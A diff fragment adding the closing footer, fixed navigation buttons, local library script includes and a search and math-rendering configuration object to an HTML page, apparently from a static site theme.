+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":-1},"comment":{},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
